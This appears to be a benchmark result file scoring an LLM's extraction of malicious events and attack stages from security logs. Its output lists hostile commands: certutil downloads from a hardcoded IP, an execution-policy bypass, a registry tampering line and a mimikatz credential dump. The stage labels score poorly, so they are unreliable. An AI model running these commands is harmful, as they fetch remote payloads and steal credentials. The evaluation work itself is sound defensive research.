@@ -1,0 +1,96 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/a x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47....B.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c 'del /f /q b.txt'",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C 'reg add HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options /v verifierdlls /t REG_DWORD /d 1 /f'",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c 'certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta'",
+        "stage": "Execution"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "nltest /domain_trusts",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c 'rm /s /q timestomp'",
+        "stage": "Execution"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The observed behaviors are consistent with an advanced threat actor conducting a multi-stage cyberattack. They initially exploit vulnerable endpoints to execute code remotely, likely via phishing emails or drive-by downloads. Post-access, they leverage social engineering via UAC bypass, utilizing trusted applications (such as `sethc.exe`) to achieve elevated privileges. Persistence is maintained via crafted registry keys, scheduled tasks, and runtime manipulation. To evade defenses, the attacker employs anti-analysis techniques and logs deletion, carefully avoiding exposure during data collection. Once inside, they employ password dumpers and network mapping to move laterally within the network, positioning themselves for follow-on attacks.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44285,
+      "completion_tokens": 1445,
+      "total_tokens": 45730,
+      "wall_clock_s": 46.617,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.36363636363636365,
+      "recall": 0.1111111111111111,
+      "f1": 0.1702127659574468,
+      "tp": 4,
+      "fp": 7,
+      "fn": 32
+    },
+    "stage": {
+      "precision": 0.09090909090909091,
+      "recall": 0.02702702702702703,
+      "f1": 0.04166666666666667,
+      "tp": 1,
+      "fp": 10,
+      "fn": 36,
+      "recall_partial": 0.08108108108108109
+    },
+    "hallucination_rate": 0.08333333333333333,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44285,
+      "completion_tokens": 1445,
+      "total_tokens": 45730,
+      "wall_clock_s": 46.617,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
